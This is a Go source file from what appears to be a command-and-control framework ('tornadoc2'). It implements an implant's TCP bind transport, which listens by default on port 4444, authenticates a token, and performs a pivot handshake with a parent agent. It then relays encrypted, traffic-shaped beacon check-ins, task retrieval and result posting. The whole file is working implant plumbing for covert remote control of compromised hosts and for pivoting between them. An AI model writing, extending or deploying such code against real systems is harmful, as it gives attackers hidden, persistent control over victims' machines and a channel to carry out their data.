package transport

import (
	"bufio"
	"crypto/subtle"
	"crypto/ecdsa"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"
	"time"

	"tornadoc2/agent/features"
	"tornadoc2/agent/internal/pivot"
	"tornadoc2/agent/protocol"
)

const (
	tcpBindAcceptTimeout    = 30 * time.Second
	tcpBindAuthTimeout      = 10 * time.Second
	tcpBindRoundTripTimeout = 60 * time.Second
	tcpBindMaxFailures      = 3
	tcpBindMaxFrame         = 16 * 1024 * 1024
)

var errAcceptTimeout = errors.New("tcp bind: accept timeout")

type tcpBindTransport struct {
	listenOn   string
	tokenHex   string
	tokenBytes []byte

	agentPriv *ecdsa.PrivateKey
	pivotPub  *ecdsa.PublicKey
	fp        string

	// shaping is the C2 profile's shaping spec, embedded at
	// build time from the same --c2-profile the parent was
	// built against. The child decrypts the wire envelope with
	// its own wire session, then unwraps the shape with this
	// spec. The parent cannot do either step on the child's
	// behalf: the wire session key belongs to the child, not
	// to the parent.
	shaping *features.ShapingSpec

	mu        sync.Mutex
	listener  net.Listener
	conn      net.Conn
	rd        *bufio.Reader
	failures  int
	closed    bool
	pivotSess *pivot.Session
}

func NewTCPBindTransport(addr, token string,
	agentPriv *ecdsa.PrivateKey,
	pivotPub *ecdsa.PublicKey,
	identity protocol.Identity,
	shaping *features.ShapingSpec) (*tcpBindTransport, error) {	

	if addr == "" {
		addr = "0.0.0.0:4444"
	}
	raw, err := hex.DecodeString(token)
	if err != nil || len(raw) == 0 {
		return nil, fmt.Errorf(
			"tcp bind: token is not valid hex (%q): %v",
			token, err)
	}
	fp := identity.Fingerprint()
	if fp == "" {
		return nil, errors.New(
			"tcp bind: identity produced an empty fingerprint")
	}
	return &tcpBindTransport{
		listenOn:   addr,
		tokenHex:   token,
		tokenBytes: raw,
		agentPriv:  agentPriv,
		pivotPub:   pivotPub,
		fp:         fp,
		shaping:    shaping,
	}, nil
}

func (t *tcpBindTransport) Name() string { return "tcp" }

func (t *tcpBindTransport) ensureListener() error {
	if t.closed {
		return errors.New("tcp bind: transport closed")
	}
	if t.listener != nil {
		return nil
	}
	ln, err := net.Listen("tcp", t.listenOn)
	if err != nil {
		return fmt.Errorf("tcp bind: listen %s: %w",
			t.listenOn, err)
	}
	t.listener = ln
	diag("[beacon] tcp bind listener on %s\n", t.listenOn)
	return nil
}

func (t *tcpBindTransport) closeListener() {
	if t.listener != nil {
		t.listener.Close()
		t.listener = nil
	}
}

func (t *tcpBindTransport) closeConn() {
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
		t.rd = nil
	}
	if t.pivotSess != nil {
		t.pivotSess.Close()
		t.pivotSess = nil
	}
}

type tcpFrameIO struct {
	conn net.Conn
	rd   *bufio.Reader
}

func (f *tcpFrameIO) WriteFrame(body []byte) error {
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(body)))
	if _, err := f.conn.Write(lenBuf[:]); err != nil {
		return err
	}
	_, err := f.conn.Write(body)
	return err
}

func (f *tcpFrameIO) ReadFrame() ([]byte, error) {
	var lenBuf [4]byte
	if _, err := io.ReadFull(f.rd, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > tcpBindMaxFrame {
		return nil, fmt.Errorf("tcp bind: invalid frame length %d", n)
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(f.rd, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func (t *tcpBindTransport) acceptOne() error {
	if err := t.ensureListener(); err != nil {
		return err
	}

	t.mu.Lock()
	ln := t.listener
	if ln == nil {
		t.mu.Unlock()
		return errors.New("tcp bind: listener not open")
	}
	if tcpl, ok := ln.(*net.TCPListener); ok {
		tcpl.SetDeadline(time.Now().Add(tcpBindAcceptTimeout))
	}
	t.mu.Unlock()

	conn, err := ln.Accept()
	if err != nil {
		if ne, ok := err.(net.Error); ok && ne.Timeout() {
			return errAcceptTimeout
		}
		return fmt.Errorf("tcp bind: accept: %w", err)
	}

	rd := bufio.NewReaderSize(conn, 64*1024)
	conn.SetReadDeadline(time.Now().Add(tcpBindAuthTimeout))
	var lenBuf [4]byte
	if _, err := io.ReadFull(rd, lenBuf[:]); err != nil {
		conn.Close()
		return fmt.Errorf("tcp bind: auth length: %w", err)
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 1024 {
		conn.Close()
		return fmt.Errorf("tcp bind: bad token frame size %d", n)
	}
	tok := make([]byte, n)
	if _, err := io.ReadFull(rd, tok); err != nil {
		conn.Close()
		return fmt.Errorf("tcp bind: auth read: %w", err)
	}
	conn.SetReadDeadline(time.Time{})

	if len(t.tokenBytes) == 0 {
		conn.Close()
		return errors.New(
			"tcp bind: no token configured, or token invalid hex")
	}
	if subtle.ConstantTimeCompare(tok, t.tokenBytes) != 1 {
		t.failures++
		conn.Close()
		if t.failures >= tcpBindMaxFailures {
			diag("[beacon] tcp bind: closing listener after %d "+
				"failed auth attempts\n", t.failures)
			t.closed = true
			t.closeListener()
			return fmt.Errorf(
				"tcp bind: too many failed attempts; " +
					"listener disabled for this process")
		}
		return errors.New("tcp bind: auth failed")
	}
	t.failures = 0

	conn.SetReadDeadline(
		time.Now().Add(tcpBindRoundTripTimeout))
	fio := &tcpFrameIO{conn: conn, rd: rd}
	sess, err := pivot.ClientHandshake(
		fio, t.agentPriv, t.pivotPub, t.fp)
	if err != nil {
		conn.Close()
		return fmt.Errorf("tcp bind: pivot handshake: %w", err)
	}
	conn.SetReadDeadline(time.Time{})

	t.mu.Lock()
	t.conn = conn
	t.rd = rd
	t.pivotSess = sess
	t.mu.Unlock()

	diag("[beacon] tcp bind: client authenticated and pivoted "+
		"from %s\n", conn.RemoteAddr().String())
	return nil
}

func (t *tcpBindTransport) ensureConn() error {
	if t.conn != nil {
		return nil
	}
	return t.acceptOne()
}

func (t *tcpBindTransport) roundTrip(req []byte) ([]byte, error) {
	t.mu.Lock()
	closed := t.closed
	conn := t.conn
	rd := t.rd
	sess := t.pivotSess
	t.mu.Unlock()

	if closed {
		return nil, errors.New("tcp bind: transport closed")
	}

	if conn == nil {
		if err := t.acceptOne(); err != nil {
			return nil, err
		}
		t.mu.Lock()
		conn = t.conn
		rd = t.rd
		sess = t.pivotSess
		t.mu.Unlock()
	}

	if conn == nil || sess == nil {
		return nil, errors.New("tcp bind: no connection")
	}

	fio := &tcpFrameIO{conn: conn, rd: rd}

	frame, err := sess.EncryptChildToParent(req)
	if err != nil {
		t.mu.Lock()
		if t.conn == conn {
			t.closeConn()
		}
		t.mu.Unlock()
		return nil, err
	}
	frameBytes, err := pivot.EncodeFrame(frame)
	if err != nil {
		t.mu.Lock()
		if t.conn == conn {
			t.closeConn()
		}
		t.mu.Unlock()
		return nil, err
	}

	conn.SetWriteDeadline(
		time.Now().Add(tcpBindRoundTripTimeout))
	if err := fio.WriteFrame(frameBytes); err != nil {
		t.mu.Lock()
		if t.conn == conn {
			t.closeConn()
		}
		t.mu.Unlock()
		return nil, err
	}

	conn.SetReadDeadline(
		time.Now().Add(tcpBindRoundTripTimeout))
	respBytes, err := fio.ReadFrame()
	if err != nil {
		t.mu.Lock()
		if t.conn == conn {
			t.closeConn()
		}
		t.mu.Unlock()
		return nil, err
	}
	respFrame, err := pivot.DecodeFrame(respBytes)
	if err != nil {
		t.mu.Lock()
		if t.conn == conn {
			t.closeConn()
		}
		t.mu.Unlock()
		return nil, err
	}
	plaintext, err := sess.DecryptParentToChild(respFrame)
	if err != nil {
		t.mu.Lock()
		if t.conn == conn {
			t.closeConn()
		}
		t.mu.Unlock()
		return nil, err
	}
	return plaintext, nil
}

func (t *tcpBindTransport) CheckIn(identity Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *WireSession) (*CheckinResponse, error) {

	payload := CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	env := map[string]interface{}{
		"op":   "beacon",
		"body": json.RawMessage(body),
	}
	reqBytes, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return nil, err
	}
	var reply struct {
		Body   json.RawMessage `json:"body"`
		Err    string          `json:"error"`
		Status int             `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &reply); err != nil {
		return nil, fmt.Errorf("tcp bind: bad reply: %w", err)
	}
	if reply.Status != 0 {
		return nil, fmt.Errorf("tcp bind: status %d: %s",
			reply.Status, reply.Err)
	}
	if reply.Err != "" {
		return nil, errors.New("tcp bind: " + reply.Err)
	}
	respBody := []byte(reply.Body)

	// Order matters and matches the HTTP transport:
	//   1. decrypt the wire envelope (the server encrypts the
	//      whole shaped body, not the inner payload)
	//   2. unwrap the shaping template (extracts the plaintext
	//      from the shaped JSON)
	//   3. unmarshal as CheckinResponse
	//
	// The parent forwards both bodies verbatim. The wire
	// session key is the child's, so only the child can do
	// step 1; and once step 1 has run, the shaped body is
	// visible for step 2.
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(respBody)
		if derr != nil {
			return nil, fmt.Errorf("tcp bind: decrypt: %w", derr)
		}
		if wasEnc {
			respBody = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		u, serr := features.ShapeUnwrap(
			respBody, t.shaping.CheckinResponse)
		if serr != nil {
			return nil, fmt.Errorf(
				"tcp bind: checkin shape: %w", serr)
		}
		respBody = u
	}
	var out CheckinResponse
	if err := json.Unmarshal(respBody, &out); err != nil {
		return nil, err
	}
	return &out, nil
}

func (t *tcpBindTransport) FetchTasks(wire *WireSession) ([]Task, error) {
	env := map[string]interface{}{"op": "tasks"}
	reqBytes, err := json.Marshal(env)
	if err != nil {
		return nil, err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return nil, err
	}
	var reply struct {
		Body   json.RawMessage `json:"body"`
		Err    string          `json:"error"`
		Status int             `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &reply); err != nil {
		return nil, fmt.Errorf("tcp bind: bad reply: %w", err)
	}
	if reply.Status != 0 {
		return nil, fmt.Errorf("tcp bind: status %d: %s",
			reply.Status, reply.Err)
	}
	if reply.Err != "" {
		return nil, errors.New("tcp bind: " + reply.Err)
	}
	body := []byte(reply.Body)

	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf("tcp bind: decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		u, serr := features.ShapeUnwrap(
			body, t.shaping.TasksResponse)
		if serr != nil {
			return nil, fmt.Errorf(
				"tcp bind: tasks shape: %w", serr)
		}
		body = u
	}
	var tasks []Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *tcpBindTransport) PostResult(r Result,
	wire *WireSession) error {

	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(
			t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	env := map[string]interface{}{
		"op":   "results",
		"body": json.RawMessage(body),
	}
	reqBytes, err := json.Marshal(env)
	if err != nil {
		return err
	}
	respBytes, err := t.roundTrip(reqBytes)
	if err != nil {
		return err
	}
	var reply struct {
		Err    string `json:"error"`
		Status int    `json:"status"`
	}
	if err := json.Unmarshal(respBytes, &reply); err != nil {
		return fmt.Errorf("tcp bind: bad reply: %w", err)
	}
	if reply.Status != 0 {
		return fmt.Errorf("tcp bind: status %d: %s",
			reply.Status, reply.Err)
	}
	if reply.Err != "" {
		return errors.New("tcp bind: " + reply.Err)
	}
	return nil
}

func (t *tcpBindTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	t.closed = true
	t.closeConn()
	t.closeListener()
	return nil
}